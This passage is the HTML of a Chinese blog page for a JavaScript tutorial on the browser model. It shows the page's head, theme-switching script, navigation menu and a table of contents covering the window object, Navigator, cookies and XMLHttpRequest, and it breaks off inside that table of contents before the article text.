<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>⑦JavaScript教程之浏览器模型 | 向阳榆木</title><meta name="description" content="⑦JavaScript教程之浏览器模型"><meta name="keywords" content="JavaScript,前端知识,浏览器模型"><meta name="author" content="PanXiaoKang"><meta name="copyright" content="PanXiaoKang"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/Lotus.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="wyZknSW2XMDLHhrSvtifCN1aQwr2nn53ydI_lDzVJmI"/><meta name="baidu-site-verification" content="p1OeTLcEA8"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="⑦JavaScript教程之浏览器模型"><meta name="twitter:description" content="⑦JavaScript教程之浏览器模型"><meta name="twitter:image" content="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg"><meta property="og:type" content="article"><meta property="og:title" content="⑦JavaScript教程之浏览器模型"><meta property="og:url" content="http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"><meta property="og:site_name" content="向阳榆木"><meta property="og:description" content="⑦JavaScript教程之浏览器模型"><meta property="og:image" content="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"><link rel="prev" title=" ⑧JavaScript教程之网页元素接口" href="http://example.com/2021/11/07/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/"><link rel="next" title="⑥JavaScript教程之事件" href="http://example.com/2021/10/04/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: {"text":"最近有点失眠了,每天被自己帅醒,帅早已成为负担,除了帅一无所有,富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善","fontSize":"20px"},
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'true',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/09/t40ARx.th.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">98</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">215</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">25</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/random/"><i class="fa-fw fa fa-random"></i><span> 随机文章</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-th-large" aria-hidden="true"></i><span> 归档</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tagsnet/"><i class="fa-fw fa fa-connectdevelop"></i><span> 关系网</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-send-o" aria-hidden="true"></i><span> 导航栏</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://xyyum.icu/mypages/OnlyI.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> 主页导航</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/xkzhdh/Integrated.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-paper-plane-o"></i><span> 综合导航</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/software/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> 软件分享</span></a></li><li><a class="site-page" href="/sunshineBookshelf/"><i class="fa-fw fa fa-university"></i><span> 向阳书架</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 列表</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 书籍</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/games/"><i class="fa-fw fa fa-gamepad"></i><span> 游戏</span></a></li><li><a class="site-page" href="/bilibili/"><i class="fa-fw fa fa-play-circle"></i><span> 番剧</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movie/"><i class="fa-fw fa fa-play-circle-o"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-link" aria-hidden="true"></i><span> 友情链接</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page" href="https://yumuxy.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> 桑榆未晚</span></a></li><li><a class="site-page" href="https://lllzxqq.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> 偏偏💖雨季</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-user-circle-o" aria-hidden="true"></i><span> 关于我</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://www.xbmu.edu.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-graduation-cap"></i><span> 母校</span></a></li><li><a class="site-page" href="/workshop/"><i class="fa-fw fa fa-heartbeat"></i><span> 作品</span></a></li><li><a class="site-page" href="/mybook/"><i class="fa-fw fa fa-book"></i><span> 自传</span></a></li><li><a class="site-page" href="/anires/"><i class="fa-fw fa fa-list-alt"></i><span> 简历</span></a></li><li><a class="site-page" href="/vcard/"><i class="fa-fw fa fa-vcard-o"></i><span> 名片</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gamepad" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://playground.z.wiki/typing-game/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> 打字游戏</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/GreedySnake/GreedySnake.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-lastfm"></i><span> 贪吃蛇</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/nineGridGame/nineGridGame.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> 抽奖游戏</span></a></li><li><a class="site-page" href="/petalage/"><i class="fa-fw fa fa-gamepad"></i><span> 表白时刻</span></a></li><li><a class="site-page" href="/yszq/"><i class="fa-fw fa fa-gamepad"></i><span> 3D元素</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gear (alias)" aria-hidden="true"></i><span> 工具平台</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/xkdm/"><i class="fa-fw fa fa-star"></i><span> 星空弹幕</span></a></li><li><a class="site-page" href="https://xyym.avosapps.us/" target="_blank" rel="noopener"><i class="fa-fw fa fa-commenting-o"></i><span> 评论管理</span></a></li><li><a class="site-page" href="https://myhkw.cn/admin/user/login/" target="_blank" rel="noopener"><i class="fa-fw fa fa-music"></i><span> 音乐后台</span></a></li><li><a class="site-page" href="https://www.superbed.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-area-chart"></i><span> 聚合图床</span></a></li><li><a class="site-page" href="/encryptedPages/"><i class="fa-fw fa fa-lock"></i><span> 加密访问</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat" aria-hidden="true"></i><span> 纪念空间</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/3d-gallery/"><i class="fa-fw fa fa-university"></i><span> 3D相册屋</span></a></li><li><a class="site-page" href="/live-photo/"><i class="fa-fw fa fa-photo"></i><span> 青春校园</span></a></li><li><a class="site-page" href="/photo-wall/"><i class="fa-fw fa fa-th"></i><span> 生活照片</span></a></li><li><a class="site-page" href="/video-wall/"><i class="fa-fw fa fa-video-camera"></i><span> 在线视频</span></a></li><li><a class="site-page" href="/mtxx/"><i class="fa-fw fa fa-file-photo-o"></i><span> 美图秀秀</span></a></li><li><a class="site-page" href="/timeStoryline/"><i class="fa-fw fa fa-file-video-o"></i><span> 时间故事线</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器环境概述"><span class="toc-number">1.</span> <span class="toc-text">浏览器环境概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码嵌入网页的方法"><span class="toc-number">1.1.</span> <span class="toc-text">代码嵌入网页的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#script-元素嵌入代码"><span class="toc-number">1.1.1.</span> <span class="toc-text">script 元素嵌入代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-元素加载外部脚本"><span class="toc-number">1.1.2.</span> <span class="toc-text">script 元素加载外部脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#事件属性"><span class="toc-number">1.1.3.</span> <span class="toc-text">事件属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL-协议"><span class="toc-number">1.1.4.</span> <span class="toc-text">URL 协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script-元素"><span class="toc-number">1.2.</span> <span class="toc-text">script 元素</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#工作原理"><span class="toc-number">1.2.1.</span> <span class="toc-text">工作原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#defer-属性"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">defer 属性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#async-属性"><span class="toc-number">1.3.</span> <span class="toc-text">async 属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#脚本的动态加载"><span class="toc-number">1.3.1.</span> <span class="toc-text">脚本的动态加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#加载使用的协议"><span class="toc-number">1.3.2.</span> <span class="toc-text">加载使用的协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器的组成"><span class="toc-number">1.4.</span> <span class="toc-text">浏览器的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#渲染引擎"><span class="toc-number">1.4.1.</span> <span class="toc-text">渲染引擎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重流和重绘"><span class="toc-number">1.4.2.</span> <span class="toc-text">重流和重绘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-引擎"><span class="toc-number">1.4.3.</span> <span class="toc-text">JavaScript 引擎</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#window对象"><span class="toc-number">2.</span> <span class="toc-text">window对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述"><span class="toc-number">2.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-对象的属性"><span class="toc-number">2.2.</span> <span class="toc-text">window 对象的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#window-name"><span class="toc-number">2.2.1.</span> <span class="toc-text">window.name</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-closed，window-opener"><span class="toc-number">2.2.2.</span> <span class="toc-text">window.closed，window.opener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-self，window-window"><span class="toc-number">2.2.3.</span> <span class="toc-text">window.self，window.window</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-frames，window-length"><span class="toc-number">2.2.4.</span> <span class="toc-text">window.frames，window.length</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-frameElement"><span class="toc-number">2.2.5.</span> <span class="toc-text">window.frameElement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-top，window-parent"><span class="toc-number">2.2.6.</span> <span class="toc-text">window.top，window.parent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-status"><span class="toc-number">2.2.7.</span> <span class="toc-text">window.status</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-devicePixelRatio"><span class="toc-number">2.2.8.</span> <span class="toc-text">window.devicePixelRatio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#位置大小属性"><span class="toc-number">2.2.9.</span> <span class="toc-text">位置大小属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#组件属性"><span class="toc-number">2.2.10.</span> <span class="toc-text">组件属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#全局对象属性"><span class="toc-number">2.2.11.</span> <span class="toc-text">全局对象属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-isSecureContext"><span class="toc-number">2.2.12.</span> <span class="toc-text">window.isSecureContext</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-对象的方法"><span class="toc-number">2.3.</span> <span class="toc-text">window 对象的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#window-alert-，window-prompt-，window-confirm"><span class="toc-number">2.3.1.</span> <span class="toc-text">window.alert()，window.prompt()，window.confirm()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-open-window-close-，window-stop"><span class="toc-number">2.3.2.</span> <span class="toc-text">window.open(), window.close()，window.stop()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-moveTo-，window-moveBy"><span class="toc-number">2.3.3.</span> <span class="toc-text">window.moveTo()，window.moveBy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-resizeTo-，window-resizeBy"><span class="toc-number">2.3.4.</span> <span class="toc-text">window.resizeTo()，window.resizeBy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-scrollTo-，window-scroll-，window-scrollBy"><span class="toc-number">2.3.5.</span> <span class="toc-text">window.scrollTo()，window.scroll()，window.scrollBy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-print"><span class="toc-number">2.3.6.</span> <span class="toc-text">window.print()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-focus-，window-blur"><span class="toc-number">2.3.7.</span> <span class="toc-text">window.focus()，window.blur()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-getSelection"><span class="toc-number">2.3.8.</span> <span class="toc-text">window.getSelection()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-getComputedStyle-，window-matchMedia"><span class="toc-number">2.3.9.</span> <span class="toc-text">window.getComputedStyle()，window.matchMedia()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-requestAnimationFrame"><span class="toc-number">2.3.10.</span> <span class="toc-text">window.requestAnimationFrame()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-requestIdleCallback"><span class="toc-number">2.3.11.</span> <span class="toc-text">window.requestIdleCallback()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#事件"><span class="toc-number">2.4.</span> <span class="toc-text">事件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-事件和-onload-属性"><span class="toc-number">2.4.1.</span> <span class="toc-text">load 事件和 onload 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#error-事件和-onerror-属性"><span class="toc-number">2.4.2.</span> <span class="toc-text">error 事件和 onerror 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-对象的事件监听属性"><span class="toc-number">2.4.3.</span> <span class="toc-text">window 对象的事件监听属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#多窗口操作"><span class="toc-number">2.5.</span> <span class="toc-text">多窗口操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#窗口的引用"><span class="toc-number">2.5.1.</span> <span class="toc-text">窗口的引用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-元素"><span class="toc-number">2.5.2.</span> <span class="toc-text">iframe 元素</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-frames-属性"><span class="toc-number">2.5.3.</span> <span class="toc-text">window.frames 属性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Navigator-对象，Screen-对象。"><span class="toc-number">3.</span> <span class="toc-text">Navigator 对象，Screen 对象。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-对象的属性"><span class="toc-number">3.1.</span> <span class="toc-text">Navigator 对象的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-userAgent"><span class="toc-number">3.1.1.</span> <span class="toc-text">Navigator.userAgent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-plugins"><span class="toc-number">3.1.2.</span> <span class="toc-text">Navigator.plugins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-platform"><span class="toc-number">3.1.3.</span> <span class="toc-text">Navigator.platform</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-onLine"><span class="toc-number">3.1.4.</span> <span class="toc-text">Navigator.onLine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-language，Navigator-languages"><span class="toc-number">3.1.5.</span> <span class="toc-text">Navigator.language，Navigator.languages</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-geolocation"><span class="toc-number">3.1.6.</span> <span class="toc-text">Navigator.geolocation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-cookieEnabled"><span class="toc-number">3.1.7.</span> <span class="toc-text">Navigator.cookieEnabled</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-对象的方法"><span class="toc-number">3.2.</span> <span class="toc-text">Navigator 对象的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-javaEnabled"><span class="toc-number">3.2.1.</span> <span class="toc-text">Navigator.javaEnabled()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-sendBeacon"><span class="toc-number">3.2.2.</span> <span class="toc-text">Navigator.sendBeacon()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-的实验性属性"><span class="toc-number">3.3.</span> <span class="toc-text">Navigator 的实验性属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-deviceMemory"><span class="toc-number">3.3.1.</span> <span class="toc-text">Navigator.deviceMemory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-hardwareConcurrency"><span class="toc-number">3.3.2.</span> <span class="toc-text">Navigator.hardwareConcurrency</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-connection"><span class="toc-number">3.3.3.</span> <span class="toc-text">Navigator.connection</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Screen-对象"><span class="toc-number">3.4.</span> <span class="toc-text">Screen 对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie"><span class="toc-number">4.</span> <span class="toc-text">Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述-1"><span class="toc-number">4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-与-HTTP-协议"><span class="toc-number">4.2.</span> <span class="toc-text">Cookie 与 HTTP 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-回应：Cookie-的生成"><span class="toc-number">4.2.1.</span> <span class="toc-text">HTTP 回应：Cookie 的生成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-请求：Cookie-的发送"><span class="toc-number">4.2.2.</span> <span class="toc-text">HTTP 请求：Cookie 的发送</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-的属性"><span class="toc-number">4.3.</span> <span class="toc-text">Cookie 的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Expires，Max-Age"><span class="toc-number">4.3.1.</span> <span class="toc-text">Expires，Max-Age</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Domain，Path"><span class="toc-number">4.3.2.</span> <span class="toc-text">Domain，Path</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secure，HttpOnly"><span class="toc-number">4.3.3.</span> <span class="toc-text">Secure，HttpOnly</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SameSite"><span class="toc-number">4.3.4.</span> <span class="toc-text">SameSite</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#document-cookie"><span class="toc-number">4.4.</span> <span class="toc-text">document.cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLHttpRequest-对象"><span class="toc-number">5.</span> <span class="toc-text">XMLHttpRequest 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">5.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest-的实例属性"><span class="toc-number">5.2.</span> <span class="toc-text">XMLHttpRequest 的实例属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-readyState"><span class="toc-number">5.2.1.</span> <span class="toc-text">XMLHttpRequest.readyState</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-onreadystatechange"><span class="toc-number">5.2.2.</span> <span class="toc-text">XMLHttpRequest.onreadystatechange</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-response"><span class="toc-number">5.2.3.</span> <span class="toc-text">XMLHttpRequest.response</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseType"><span class="toc-number">5.2.4.</span> <span class="toc-text">XMLHttpRequest.responseType</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseText"><span class="toc-number">5.2.5.</span> <span class="toc-text">XMLHttpRequest.responseText</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseXML"><span class="toc-number">5.2.6.</span> <span class="toc-text">XMLHttpRequest.responseXML</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseURL"><span class="toc-number">5.2.7.</span> <span class="toc-text">XMLHttpRequest.responseURL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-status，XMLHttpRequest-statusText"><span class="toc-number">5.2.8.</span> <span class="toc-text">XMLHttpRequest.status，XMLHttpRequest.statusText</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-timeout，XMLHttpRequestEventTarget-ontimeout"><span class="toc-number">5.2.9.</span> <span class="toc-text">XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#事件监听属性"><span class="toc-number">5.2.10.</span> <span class="toc-text">事件监听属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-withCredentials"><span class="toc-number">5.2.11.</span> <span class="toc-text">XMLHttpRequest.withCredentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-upload"><span class="toc-number">5.2.12.</span> <span class="toc-text">XMLHttpRequest.upload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest-的实例方法"><span class="toc-number">5.3.</span> <span class="toc-text">XMLHttpRequest 的实例方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-open"><span class="toc-number">5.3.1.</span> <span class="toc-text">XMLHttpRequest.open()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-send"><span class="toc-number">5.3.2.</span> <span class="toc-text">XMLHttpRequest.send()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-setRequestHeader"><span class="toc-number">5.3.3.</span> <span class="toc-text">XMLHttpRequest.setRequestHeader()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-overrideMimeType"><span class="toc-number">5.3.4.</span> <span class="toc-text">XMLHttpRequest.overrideMimeType()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-getResponseHeader"><span class="toc-number">5.3.5.</span> <span class="toc-text">XMLHttpRequest.getResponseHeader()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-getAllResponseHeaders"><span class="toc-number">5.3.6.</span> <span 